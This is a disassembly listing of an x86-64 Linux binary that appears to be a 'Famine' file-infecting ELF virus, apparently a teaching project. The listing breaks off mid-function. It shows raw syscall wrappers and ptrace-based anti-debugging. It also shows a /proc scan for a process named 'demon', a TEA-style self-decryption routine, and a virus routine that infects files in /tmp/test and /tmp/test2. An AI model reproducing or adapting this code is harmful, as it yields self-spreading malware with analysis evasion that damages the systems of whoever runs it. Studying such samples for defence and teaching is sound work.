    1676:	4c 89 4d d8          	mov    %r9,-0x28(%rbp)
    167a:	49 89 ca             	mov    %rcx,%r10
    167d:	48 c7 c0 09 00 00 00 	mov    $0x9,%rax
    1684:	0f 05                	syscall 
    1686:	c9                   	leaveq 
    1687:	c3                   	retq   
    1688:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
    168f:	00 

0000000000001690 <famine_mprotect>:
    1690:	55                   	push   %rbp
    1691:	48 89 e5             	mov    %rsp,%rbp
    1694:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    1698:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
    169c:	89 55 ec             	mov    %edx,-0x14(%rbp)
    169f:	49 89 ca             	mov    %rcx,%r10
    16a2:	48 c7 c0 0a 00 00 00 	mov    $0xa,%rax
    16a9:	0f 05                	syscall 
    16ab:	c9                   	leaveq 
    16ac:	c3                   	retq   
    16ad:	0f 1f 00             	nopl   (%rax)

00000000000016b0 <famine_munmap>:
    16b0:	55                   	push   %rbp
    16b1:	48 89 e5             	mov    %rsp,%rbp
    16b4:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    16b8:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
    16bc:	49 89 ca             	mov    %rcx,%r10
    16bf:	48 c7 c0 0b 00 00 00 	mov    $0xb,%rax
    16c6:	0f 05                	syscall 
    16c8:	c9                   	leaveq 
    16c9:	c3                   	retq   
    16ca:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

00000000000016d0 <famine_exit>:
    16d0:	55                   	push   %rbp
    16d1:	48 89 e5             	mov    %rsp,%rbp
    16d4:	89 7d fc             	mov    %edi,-0x4(%rbp)
    16d7:	49 89 ca             	mov    %rcx,%r10
    16da:	48 c7 c0 3c 00 00 00 	mov    $0x3c,%rax
    16e1:	0f 05                	syscall 
    16e3:	c9                   	leaveq 
    16e4:	c3                   	retq   
    16e5:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
    16ec:	00 00 00 
    16ef:	90                   	nop

00000000000016f0 <famine_ptrace>:
    16f0:	55                   	push   %rbp
    16f1:	48 89 e5             	mov    %rsp,%rbp
    16f4:	89 7d fc             	mov    %edi,-0x4(%rbp)
    16f7:	89 75 f8             	mov    %esi,-0x8(%rbp)
    16fa:	48 89 55 f0          	mov    %rdx,-0x10(%rbp)
    16fe:	48 89 4d e8          	mov    %rcx,-0x18(%rbp)
    1702:	49 89 ca             	mov    %rcx,%r10
    1705:	48 c7 c0 65 00 00 00 	mov    $0x65,%rax
    170c:	0f 05                	syscall 
    170e:	c9                   	leaveq 
    170f:	c3                   	retq   

0000000000001710 <famine_getdents64>:
    1710:	55                   	push   %rbp
    1711:	48 89 e5             	mov    %rsp,%rbp
    1714:	89 7d fc             	mov    %edi,-0x4(%rbp)
    1717:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
    171b:	89 55 ec             	mov    %edx,-0x14(%rbp)
    171e:	49 89 ca             	mov    %rcx,%r10
    1721:	48 c7 c0 d9 00 00 00 	mov    $0xd9,%rax
    1728:	0f 05                	syscall 
    172a:	c9                   	leaveq 
    172b:	c3                   	retq   
    172c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000001730 <detect_spy>:
    1730:	55                   	push   %rbp
    1731:	48 89 e5             	mov    %rsp,%rbp
    1734:	48 83 ec 10          	sub    $0x10,%rsp
    1738:	31 c0                	xor    %eax,%eax
    173a:	31 c9                	xor    %ecx,%ecx
    173c:	89 ca                	mov    %ecx,%edx
    173e:	89 c7                	mov    %eax,%edi
    1740:	89 c6                	mov    %eax,%esi
    1742:	48 89 55 f0          	mov    %rdx,-0x10(%rbp)
    1746:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
    174a:	e8 a1 ff ff ff       	callq  16f0 <famine_ptrace>
    174f:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
    1753:	0f 85 09 00 00 00    	jne    1762 <detect_spy+0x32>
    1759:	c6 45 ff 01          	movb   $0x1,-0x1(%rbp)
    175d:	e9 0a 00 00 00       	jmpq   176c <detect_spy+0x3c>
    1762:	e8 19 00 00 00       	callq  1780 <detect_process>
    1767:	24 01                	and    $0x1,%al
    1769:	88 45 ff             	mov    %al,-0x1(%rbp)
    176c:	8a 45 ff             	mov    -0x1(%rbp),%al
    176f:	24 01                	and    $0x1,%al
    1771:	0f b6 c0             	movzbl %al,%eax
    1774:	48 83 c4 10          	add    $0x10,%rsp
    1778:	5d                   	pop    %rbp
    1779:	c3                   	retq   
    177a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

0000000000001780 <detect_process>:
    1780:	55                   	push   %rbp
    1781:	48 89 e5             	mov    %rsp,%rbp
    1784:	48 81 ec 50 14 00 00 	sub    $0x1450,%rsp
    178b:	48 8d bd f0 ef ff ff 	lea    -0x1010(%rbp),%rdi
    1792:	48 8d 85 c9 eb ff ff 	lea    -0x1437(%rbp),%rax
    1799:	c6 85 c9 eb ff ff 2f 	movb   $0x2f,-0x1437(%rbp)
    17a0:	c6 85 ca eb ff ff 70 	movb   $0x70,-0x1436(%rbp)
    17a7:	c6 85 cb eb ff ff 72 	movb   $0x72,-0x1435(%rbp)
    17ae:	c6 85 cc eb ff ff 6f 	movb   $0x6f,-0x1434(%rbp)
    17b5:	c6 85 cd eb ff ff 63 	movb   $0x63,-0x1433(%rbp)
    17bc:	c6 85 ce eb ff ff 2f 	movb   $0x2f,-0x1432(%rbp)
    17c3:	c6 85 cf eb ff ff 00 	movb   $0x0,-0x1431(%rbp)
    17ca:	48 89 85 d0 eb ff ff 	mov    %rax,-0x1430(%rbp)
    17d1:	48 8b b5 d0 eb ff ff 	mov    -0x1430(%rbp),%rsi
    17d8:	e8 e3 fb ff ff       	callq  13c0 <ft_strcpy>
    17dd:	48 8d 8d f0 ef ff ff 	lea    -0x1010(%rbp),%rcx
    17e4:	48 8b bd d0 eb ff ff 	mov    -0x1430(%rbp),%rdi
    17eb:	48 89 85 b8 eb ff ff 	mov    %rax,-0x1448(%rbp)
    17f2:	48 89 8d b0 eb ff ff 	mov    %rcx,-0x1450(%rbp)
    17f9:	e8 12 fb ff ff       	callq  1310 <ft_strlen>
    17fe:	31 f6                	xor    %esi,%esi
    1800:	48 8d bd f0 ef ff ff 	lea    -0x1010(%rbp),%rdi
    1807:	48 8b 8d b0 eb ff ff 	mov    -0x1450(%rbp),%rcx
    180e:	48 01 c1             	add    %rax,%rcx
    1811:	48 89 8d e8 ef ff ff 	mov    %rcx,-0x1018(%rbp)
    1818:	b0 00                	mov    $0x0,%al
    181a:	e8 e1 fd ff ff       	callq  1600 <famine_open>
    181f:	89 85 c4 eb ff ff    	mov    %eax,-0x143c(%rbp)
    1825:	83 bd c4 eb ff ff ff 	cmpl   $0xffffffff,-0x143c(%rbp)
    182c:	0f 85 09 00 00 00    	jne    183b <detect_process+0xbb>
    1832:	c6 45 ff 01          	movb   $0x1,-0x1(%rbp)
    1836:	e9 83 00 00 00       	jmpq   18be <detect_process+0x13e>
    183b:	e9 00 00 00 00       	jmpq   1840 <detect_process+0xc0>
    1840:	48 8d 85 e0 eb ff ff 	lea    -0x1420(%rbp),%rax
    1847:	8b bd c4 eb ff ff    	mov    -0x143c(%rbp),%edi
    184d:	48 89 c6             	mov    %rax,%rsi
    1850:	ba 00 04 00 00       	mov    $0x400,%edx
    1855:	e8 b6 fe ff ff       	callq  1710 <famine_getdents64>
    185a:	89 85 dc eb ff ff    	mov    %eax,-0x1424(%rbp)
    1860:	83 f8 00             	cmp    $0x0,%eax
    1863:	0f 8e 46 00 00 00    	jle    18af <detect_process+0x12f>
    1869:	48 8d 95 e0 eb ff ff 	lea    -0x1420(%rbp),%rdx
    1870:	48 8d bd f0 ef ff ff 	lea    -0x1010(%rbp),%rdi
    1877:	48 8b b5 e8 ef ff ff 	mov    -0x1018(%rbp),%rsi
    187e:	8b 8d dc eb ff ff    	mov    -0x1424(%rbp),%ecx
    1884:	e8 47 00 00 00       	callq  18d0 <browse_dirent>
    1889:	a8 01                	test   $0x1,%al
    188b:	0f 85 05 00 00 00    	jne    1896 <detect_process+0x116>
    1891:	e9 14 00 00 00       	jmpq   18aa <detect_process+0x12a>
    1896:	8b bd c4 eb ff ff    	mov    -0x143c(%rbp),%edi
    189c:	e8 7f fd ff ff       	callq  1620 <famine_close>
    18a1:	c6 45 ff 01          	movb   $0x1,-0x1(%rbp)
    18a5:	e9 14 00 00 00       	jmpq   18be <detect_process+0x13e>
    18aa:	e9 91 ff ff ff       	jmpq   1840 <detect_process+0xc0>
    18af:	8b bd c4 eb ff ff    	mov    -0x143c(%rbp),%edi
    18b5:	e8 66 fd ff ff       	callq  1620 <famine_close>
    18ba:	c6 45 ff 00          	movb   $0x0,-0x1(%rbp)
    18be:	8a 45 ff             	mov    -0x1(%rbp),%al
    18c1:	24 01                	and    $0x1,%al
    18c3:	0f b6 c0             	movzbl %al,%eax
    18c6:	48 81 c4 50 14 00 00 	add    $0x1450,%rsp
    18cd:	5d                   	pop    %rbp
    18ce:	c3                   	retq   
    18cf:	90                   	nop

00000000000018d0 <browse_dirent>:
    18d0:	55                   	push   %rbp
    18d1:	48 89 e5             	mov    %rsp,%rbp
    18d4:	48 83 ec 50          	sub    $0x50,%rsp
    18d8:	48 89 7d f0          	mov    %rdi,-0x10(%rbp)
    18dc:	48 89 75 e8          	mov    %rsi,-0x18(%rbp)
    18e0:	48 89 55 e0          	mov    %rdx,-0x20(%rbp)
    18e4:	89 4d dc             	mov    %ecx,-0x24(%rbp)
    18e7:	c7 45 d8 00 00 00 00 	movl   $0x0,-0x28(%rbp)
    18ee:	8b 45 d8             	mov    -0x28(%rbp),%eax
    18f1:	3b 45 dc             	cmp    -0x24(%rbp),%eax
    18f4:	0f 8d af 00 00 00    	jge    19a9 <browse_dirent+0xd9>
    18fa:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    18fe:	48 63 4d d8          	movslq -0x28(%rbp),%rcx
    1902:	48 01 c8             	add    %rcx,%rax
    1905:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
    1909:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    190d:	0f b6 50 12          	movzbl 0x12(%rax),%edx
    1911:	83 fa 04             	cmp    $0x4,%edx
    1914:	0f 85 7c 00 00 00    	jne    1996 <browse_dirent+0xc6>
    191a:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    191e:	0f be 48 13          	movsbl 0x13(%rax),%ecx
    1922:	83 f9 2e             	cmp    $0x2e,%ecx
    1925:	0f 84 6b 00 00 00    	je     1996 <browse_dirent+0xc6>
    192b:	48 8b 7d e8          	mov    -0x18(%rbp),%rdi
    192f:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    1933:	48 05 13 00 00 00    	add    $0x13,%rax
    1939:	48 89 c6             	mov    %rax,%rsi
    193c:	e8 7f fa ff ff       	callq  13c0 <ft_strcpy>
    1941:	48 8b 7d f0          	mov    -0x10(%rbp),%rdi
    1945:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
    1949:	48 8b 55 d0          	mov    -0x30(%rbp),%rdx
    194d:	48 81 c2 13 00 00 00 	add    $0x13,%rdx
    1954:	48 89 7d c8          	mov    %rdi,-0x38(%rbp)
    1958:	48 89 d7             	mov    %rdx,%rdi
    195b:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
    195f:	48 89 4d b8          	mov    %rcx,-0x48(%rbp)
    1963:	e8 a8 f9 ff ff       	callq  1310 <ft_strlen>
    1968:	48 8b 4d b8          	mov    -0x48(%rbp),%rcx
    196c:	48 01 c1             	add    %rax,%rcx
    196f:	48 8b 7d c8          	mov    -0x38(%rbp),%rdi
    1973:	48 89 ce             	mov    %rcx,%rsi
    1976:	e8 45 00 00 00       	callq  19c0 <is_target>
    197b:	a8 01                	test   $0x1,%al
    197d:	0f 85 05 00 00 00    	jne    1988 <browse_dirent+0xb8>
    1983:	e9 09 00 00 00       	jmpq   1991 <browse_dirent+0xc1>
    1988:	c6 45 ff 01          	movb   $0x1,-0x1(%rbp)
    198c:	e9 1c 00 00 00       	jmpq   19ad <browse_dirent+0xdd>
    1991:	e9 00 00 00 00       	jmpq   1996 <browse_dirent+0xc6>
    1996:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    199a:	0f b7 48 10          	movzwl 0x10(%rax),%ecx
    199e:	03 4d d8             	add    -0x28(%rbp),%ecx
    19a1:	89 4d d8             	mov    %ecx,-0x28(%rbp)
    19a4:	e9 45 ff ff ff       	jmpq   18ee <browse_dirent+0x1e>
    19a9:	c6 45 ff 00          	movb   $0x0,-0x1(%rbp)
    19ad:	8a 45 ff             	mov    -0x1(%rbp),%al
    19b0:	24 01                	and    $0x1,%al
    19b2:	0f b6 c0             	movzbl %al,%eax
    19b5:	48 83 c4 50          	add    $0x50,%rsp
    19b9:	5d                   	pop    %rbp
    19ba:	c3                   	retq   
    19bb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

00000000000019c0 <is_target>:
    19c0:	55                   	push   %rbp
    19c1:	48 89 e5             	mov    %rsp,%rbp
    19c4:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
    19cb:	48 8d 45 9a          	lea    -0x66(%rbp),%rax
    19cf:	48 8d 4d af          	lea    -0x51(%rbp),%rcx
    19d3:	48 89 7d f0          	mov    %rdi,-0x10(%rbp)
    19d7:	48 89 75 e8          	mov    %rsi,-0x18(%rbp)
    19db:	c6 45 af 28          	movb   $0x28,-0x51(%rbp)
    19df:	c6 45 b0 64          	movb   $0x64,-0x50(%rbp)
    19e3:	c6 45 b1 65          	movb   $0x65,-0x4f(%rbp)
    19e7:	c6 45 b2 61          	movb   $0x61,-0x4e(%rbp)
    19eb:	c6 45 b3 6d          	movb   $0x6d,-0x4d(%rbp)
    19ef:	c6 45 b4 6f          	movb   $0x6f,-0x4c(%rbp)
    19f3:	c6 45 b5 6e          	movb   $0x6e,-0x4b(%rbp)
    19f7:	c6 45 b6 29          	movb   $0x29,-0x4a(%rbp)
    19fb:	c6 45 b7 00          	movb   $0x0,-0x49(%rbp)
    19ff:	48 89 4d b8          	mov    %rcx,-0x48(%rbp)
    1a03:	c6 45 9a 2f          	movb   $0x2f,-0x66(%rbp)
    1a07:	c6 45 9b 73          	movb   $0x73,-0x65(%rbp)
    1a0b:	c6 45 9c 74          	movb   $0x74,-0x64(%rbp)
    1a0f:	c6 45 9d 61          	movb   $0x61,-0x63(%rbp)
    1a13:	c6 45 9e 74          	movb   $0x74,-0x62(%rbp)
    1a17:	c6 45 9f 00          	movb   $0x0,-0x61(%rbp)
    1a1b:	48 89 45 a0          	mov    %rax,-0x60(%rbp)
    1a1f:	48 8b 7d e8          	mov    -0x18(%rbp),%rdi
    1a23:	48 8b 75 a0          	mov    -0x60(%rbp),%rsi
    1a27:	e8 94 f9 ff ff       	callq  13c0 <ft_strcpy>
    1a2c:	31 f6                	xor    %esi,%esi
    1a2e:	48 8b 7d f0          	mov    -0x10(%rbp),%rdi
    1a32:	48 89 45 88          	mov    %rax,-0x78(%rbp)
    1a36:	b0 00                	mov    $0x0,%al
    1a38:	e8 c3 fb ff ff       	callq  1600 <famine_open>
    1a3d:	89 45 94             	mov    %eax,-0x6c(%rbp)
    1a40:	83 7d 94 00          	cmpl   $0x0,-0x6c(%rbp)
    1a44:	0f 8d 09 00 00 00    	jge    1a53 <is_target+0x93>
    1a4a:	c6 45 ff 00          	movb   $0x0,-0x1(%rbp)
    1a4e:	e9 63 00 00 00       	jmpq   1ab6 <is_target+0xf6>
    1a53:	48 8d 75 c0          	lea    -0x40(%rbp),%rsi
    1a57:	8b 7d 94             	mov    -0x6c(%rbp),%edi
    1a5a:	ba 20 00 00 00       	mov    $0x20,%edx
    1a5f:	e8 5c fb ff ff       	callq  15c0 <famine_read>
    1a64:	89 45 90             	mov    %eax,-0x70(%rbp)
    1a67:	83 7d 90 00          	cmpl   $0x0,-0x70(%rbp)
    1a6b:	0f 8d 11 00 00 00    	jge    1a82 <is_target+0xc2>
    1a71:	8b 7d 94             	mov    -0x6c(%rbp),%edi
    1a74:	e8 a7 fb ff ff       	callq  1620 <famine_close>
    1a79:	c6 45 ff 00          	movb   $0x0,-0x1(%rbp)
    1a7d:	e9 34 00 00 00       	jmpq   1ab6 <is_target+0xf6>
    1a82:	48 8d 7d c0          	lea    -0x40(%rbp),%rdi
    1a86:	48 8b 75 b8          	mov    -0x48(%rbp),%rsi
    1a8a:	e8 21 fa ff ff       	callq  14b0 <ft_strstr>
    1a8f:	48 83 f8 00          	cmp    $0x0,%rax
    1a93:	0f 84 11 00 00 00    	je     1aaa <is_target+0xea>
    1a99:	8b 7d 94             	mov    -0x6c(%rbp),%edi
    1a9c:	e8 7f fb ff ff       	callq  1620 <famine_close>
    1aa1:	c6 45 ff 01          	movb   $0x1,-0x1(%rbp)
    1aa5:	e9 0c 00 00 00       	jmpq   1ab6 <is_target+0xf6>
    1aaa:	8b 7d 94             	mov    -0x6c(%rbp),%edi
    1aad:	e8 6e fb ff ff       	callq  1620 <famine_close>
    1ab2:	c6 45 ff 00          	movb   $0x0,-0x1(%rbp)
    1ab6:	8a 45 ff             	mov    -0x1(%rbp),%al
    1ab9:	24 01                	and    $0x1,%al
    1abb:	0f b6 c0             	movzbl %al,%eax
    1abe:	48 81 c4 80 00 00 00 	add    $0x80,%rsp
    1ac5:	5d                   	pop    %rbp
    1ac6:	c3                   	retq   
    1ac7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
    1ace:	00 00 

0000000000001ad0 <decrypt>:
    1ad0:	55                   	push   %rbp
    1ad1:	48 89 e5             	mov    %rsp,%rbp
    1ad4:	41 54                	push   %r12
    1ad6:	41 55                	push   %r13
    1ad8:	49 89 fc             	mov    %rdi,%r12
    1adb:	49 89 cd             	mov    %rcx,%r13
    1ade:	bf b9 79 37 9e       	mov    $0x9e3779b9,%edi
    1ae3:	e9 a4 00 00 00       	jmpq   1b8c <__while_size_ge_8>

0000000000001ae8 <decipher>:
    1ae8:	4c 8b 1e             	mov    (%rsi),%r11
    1aeb:	4d 89 da             	mov    %r11,%r10
    1aee:	49 c1 eb 20          	shr    $0x20,%r11
    1af2:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    1af7:	49 21 c2             	and    %rax,%r10
    1afa:	4c 89 e1             	mov    %r12,%rcx
    1afd:	48 89 f8             	mov    %rdi,%rax
    1b00:	48 0f af c1          	imul   %rcx,%rax

0000000000001b04 <__loop_num_rounds>:
    1b04:	4d 89 d0             	mov    %r10,%r8
    1b07:	49 c1 e0 04          	shl    $0x4,%r8
    1b0b:	4d 89 d1             	mov    %r10,%r9
    1b0e:	49 c1 e9 05          	shr    $0x5,%r9
    1b12:	4d 31 c8             	xor    %r9,%r8
    1b15:	4d 01 d0             	add    %r10,%r8
    1b18:	49 89 c1             	mov    %rax,%r9
    1b1b:	49 c1 e9 0b          	shr    $0xb,%r9
    1b1f:	49 83 e1 03          	and    $0x3,%r9
    1b23:	49 c1 e1 02          	shl    $0x2,%r9
    1b27:	49 01 d1             	add    %rdx,%r9
    1b2a:	45 8b 09             	mov    (%r9),%r9d
    1b2d:	49 01 c1             	add    %rax,%r9
    1b30:	4d 31 c8             	xor    %r9,%r8
    1b33:	45 29 c3             	sub    %r8d,%r11d
    1b36:	48 29 f8             	sub    %rdi,%rax
    1b39:	4d 89 d8             	mov    %r11,%r8
    1b3c:	49 c1 e0 04          	shl    $0x4,%r8
    1b40:	4d 89 d9             	mov    %r11,%r9
    1b43:	49 c1 e9 05          	shr    $0x5,%r9
    1b47:	4d 31 c8             	xor    %r9,%r8
    1b4a:	4d 01 d8             	add    %r11,%r8
    1b4d:	49 89 c1             	mov    %rax,%r9
    1b50:	49 83 e1 03          	and    $0x3,%r9
    1b54:	49 c1 e1 02          	shl    $0x2,%r9
    1b58:	49 01 d1             	add    %rdx,%r9
    1b5b:	45 8b 09             	mov    (%r9),%r9d
    1b5e:	49 01 c1             	add    %rax,%r9
    1b61:	4d 31 c8             	xor    %r9,%r8
    1b64:	45 29 c2             	sub    %r8d,%r10d
    1b67:	48 ff c9             	dec    %rcx
    1b6a:	48 85 c9             	test   %rcx,%rcx
    1b6d:	75 95                	jne    1b04 <__loop_num_rounds>
    1b6f:	4c 89 d8             	mov    %r11,%rax
    1b72:	48 c1 e0 20          	shl    $0x20,%rax
    1b76:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
    1b7b:	49 21 ca             	and    %rcx,%r10
    1b7e:	4c 09 d0             	or     %r10,%rax
    1b81:	48 89 06             	mov    %rax,(%rsi)
    1b84:	48 83 c6 08          	add    $0x8,%rsi
    1b88:	49 83 ed 08          	sub    $0x8,%r13

0000000000001b8c <__while_size_ge_8>:
    1b8c:	49 83 fd 08          	cmp    $0x8,%r13
    1b90:	0f 8d 52 ff ff ff    	jge    1ae8 <decipher>
    1b96:	41 5d                	pop    %r13
    1b98:	41 5c                	pop    %r12
    1b9a:	c9                   	leaveq 
    1b9b:	c3                   	retq   
    1b9c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000001ba0 <virus>:
    1ba0:	55                   	push   %rbp
    1ba1:	48 89 e5             	mov    %rsp,%rbp
    1ba4:	48 83 ec 30          	sub    $0x30,%rsp
    1ba8:	48 8d 45 db          	lea    -0x25(%rbp),%rax
    1bac:	48 8d 4d e6          	lea    -0x1a(%rbp),%rcx
    1bb0:	c6 45 e6 2f          	movb   $0x2f,-0x1a(%rbp)
    1bb4:	c6 45 e7 74          	movb   $0x74,-0x19(%rbp)
    1bb8:	c6 45 e8 6d          	movb   $0x6d,-0x18(%rbp)
    1bbc:	c6 45 e9 70          	movb   $0x70,-0x17(%rbp)
    1bc0:	c6 45 ea 2f          	movb   $0x2f,-0x16(%rbp)
    1bc4:	c6 45 eb 74          	movb   $0x74,-0x15(%rbp)
    1bc8:	c6 45 ec 65          	movb   $0x65,-0x14(%rbp)
    1bcc:	c6 45 ed 73          	movb   $0x73,-0x13(%rbp)
    1bd0:	c6 45 ee 74          	movb   $0x74,-0x12(%rbp)
    1bd4:	c6 45 ef 00          	movb   $0x0,-0x11(%rbp)
    1bd8:	48 89 4d f0          	mov    %rcx,-0x10(%rbp)
    1bdc:	c6 45 db 2f          	movb   $0x2f,-0x25(%rbp)
    1be0:	c6 45 dc 74          	movb   $0x74,-0x24(%rbp)
    1be4:	c6 45 dd 6d          	movb   $0x6d,-0x23(%rbp)
    1be8:	c6 45 de 70          	movb   $0x70,-0x22(%rbp)
    1bec:	c6 45 df 2f          	movb   $0x2f,-0x21(%rbp)
    1bf0:	c6 45 e0 74          	movb   $0x74,-0x20(%rbp)
    1bf4:	c6 45 e1 65          	movb   $0x65,-0x1f(%rbp)
    1bf8:	c6 45 e2 73          	movb   $0x73,-0x1e(%rbp)
    1bfc:	c6 45 e3 74          	movb   $0x74,-0x1d(%rbp)
    1c00:	c6 45 e4 32          	movb   $0x32,-0x1c(%rbp)
    1c04:	c6 45 e5 00          	movb   $0x0,-0x1b(%rbp)
    1c08:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    1c0c:	48 c7 45 d0 00 00 00 	movq   $0x0,-0x30(%rbp)
    1c13:	00 
    1c14:	48 83 7d d0 02       	cmpq   $0x2,-0x30(%rbp)
    1c19:	0f 83 21 00 00 00    	jae    1c40 <virus+0xa0>
    1c1f:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    1c23:	48 8b 7c c5 f0       	mov    -0x10(%rbp,%rax,8),%rdi
    1c28:	e8 03 09 00 00       	callq  2530 <infect_files_in>
    1c2d:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    1c31:	48 05 01 00 00 00    	add    $0x1,%rax
    1c37:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
    1c3b:	e9 d4 ff ff ff       	jmpq   1c14 <virus+0x74>
    1c40:	48 83 c4 30          	add    $0x30,%rsp
    1c44:	5d                   	pop    %rbp
    1c45:	c3                   	retq   
    1c46:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
    1c4d:	00 00 00 

0000000000001c50 <safe_accessor>:
    1c50:	55                   	push   %rbp
    1c51:	48 89 e5             	mov    %rsp,%rbp
    1c54:	48 89 55 e8          	mov    %rdx,-0x18(%rbp)
    1c58:	48 89 4d f0          	mov    %rcx,-0x10(%rbp)
    1c5c:	48 89 7d e0          	mov    %rdi,-0x20(%rbp)
    1c60:	48 89 75 d8          	mov    %rsi,-0x28(%rbp)
    1c64:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    1c68:	48 03 45 d8          	add    -0x28(%rbp),%rax
    1c6c:	48 3b 45 f0          	cmp    -0x10(%rbp),%rax
    1c70:	0f 87 12 00 00 00    	ja     1c88 <safe_accessor+0x38>
    1c76:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    1c7a:	48 03 45 d8          	add    -0x28(%rbp),%rax
    1c7e:	48 3b 45 e0          	cmp    -0x20(%rbp),%rax
    1c82:	0f 83 0d 00 00 00    	jae    1c95 <safe_accessor+0x45>
    1c88:	48 c7 45 f8 00 00 00 	movq   $0x0,-0x8(%rbp)
    1c8f:	00 
    1c90:	e9 0c 00 00 00       	jmpq   1ca1 <safe_accessor+0x51>
    1c95:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    1c99:	48 03 45 e0          	add    -0x20(%rbp),%rax
    1c9d:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    1ca1:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1ca5:	5d                   	pop    %rbp
    1ca6:	c3                   	retq   
    1ca7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
    1cae:	00 00 

0000000000001cb0 <free_accessor>:
    1cb0:	55                   	push   %rbp
    1cb1:	48 89 e5             	mov    %rsp,%rbp
    1cb4:	48 83 ec 10          	sub    $0x10,%rsp
    1cb8:	48 89 7d f0          	mov    %rdi,-0x10(%rbp)
    1cbc:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    1cc0:	48 83 38 00          	cmpq   $0x0,(%rax)
    1cc4:	0f 84 2b 00 00 00    	je     1cf5 <free_accessor+0x45>
    1cca:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    1cce:	48 8b 38             	mov    (%rax),%rdi
    1cd1:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    1cd5:	48 8b 70 08          	mov    0x8(%rax),%rsi
    1cd9:	e8 d2 f9 ff ff       	callq  16b0 <famine_munmap>
    1cde:	83 f8 00             	cmp    $0x0,%eax
    1ce1:	0f 84 09 00 00 00    	je     1cf0 <free_accessor+0x40>
    1ce7:	c6 45 ff 00          	movb   $0x0,-0x1(%rbp)
    1ceb:	e9 09 00 00 00       	jmpq   1cf9 <free_accessor+0x49>
    1cf0:	e9 00 00 00 00       	jmpq   1cf5 <free_accessor+0x45>
    1cf5:	c6 45 ff 01          	movb   $0x1,-0x1(%rbp)
    1cf9:	8a 45 ff             	mov    -0x1(%rbp),%al
    1cfc:	24 01                	and    $0x1,%al
    1cfe:	0f b6 c0             	movzbl %al,%eax
    1d01:	48 83 c4 10          	add    $0x10,%rsp
    1d05:	5d                   	pop    %rbp
    1d06:	c3                   	retq   
    1d07:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
    1d0e:	00 00 

0000000000001d10 <original_accessor>:
    1d10:	55                   	push   %rbp
    1d11:	48 89 e5             	mov    %rsp,%rbp
    1d14:	48 81 ec c0 00 00 00 	sub    $0xc0,%rsp
    1d1b:	31 c0                	xor    %eax,%eax
    1d1d:	48 89 7d f0          	mov    %rdi,-0x10(%rbp)
    1d21:	48 89 75 e8          	mov    %rsi,-0x18(%rbp)
    1d25:	48 8b 7d e8          	mov    -0x18(%rbp),%rdi
    1d29:	89 c6                	mov    %eax,%esi
    1d2b:	b0 00                	mov    $0x0,%al
    1d2d:	e8 ce f8 ff ff       	callq  1600 <famine_open>
    1d32:	89 85 4c ff ff ff    	mov    %eax,-0xb4(%rbp)
    1d38:	83 bd 4c ff ff ff 00 	cmpl   $0x0,-0xb4(%rbp)
    1d3f:	0f 8d 09 00 00 00    	jge    1d4e <original_accessor+0x3e>
    1d45:	c6 45 ff 00          	movb   $0x0,-0x1(%rbp)
    1d49:	e9 e8 00 00 00       	jmpq   1e36 <original_accessor+0x126>
    1d4e:	8b bd 4c ff ff ff    	mov    -0xb4(%rbp),%edi
    1d54:	48 8d b5 50 ff ff ff 	lea    -0xb0(%rbp),%rsi
    1d5b:	e8 e0 f8 ff ff       	callq  1640 <famine_fstat>
    1d60:	83 f8 00             	cmp    $0x0,%eax
    1d63:	0f 8d 14 00 00 00    	jge    1d7d <original_accessor+0x6d>
    1d69:	8b bd 4c ff ff ff    	mov    -0xb4(%rbp),%edi
    1d6f:	e8 ac f8 ff ff       	callq  1620 <famine_close>
    1d74:	c6 45 ff 00          	movb   $0x0,-0x1(%rbp)
    1d78:	e9 b9 00 00 00       	jmpq   1e36 <original_accessor+0x126>
    1d7d:	8b 85 68 ff ff ff    	mov    -0x98(%rbp),%eax
    1d83:	25 00 40 00 00       	and    $0x4000,%eax
    1d88:	83 f8 00             	cmp    $0x0,%eax
    1d8b:	0f 84 14 00 00 00    	je     1da5 <original_accessor+0x95>
    1d91:	8b bd 4c ff ff ff    	mov    -0xb4(%rbp),%edi
    1d97:	e8 84 f8 ff ff       	callq  1620 <famine_close>
    1d9c:	c6 45 ff 00          	movb   $0x0,-0x1(%rbp)
    1da0:	e9 91 00 00 00       	jmpq   1e36 <original_accessor+0x126>
    1da5:	31 c0                	xor    %eax,%eax
    1da7:	89 c1                	mov    %eax,%ecx
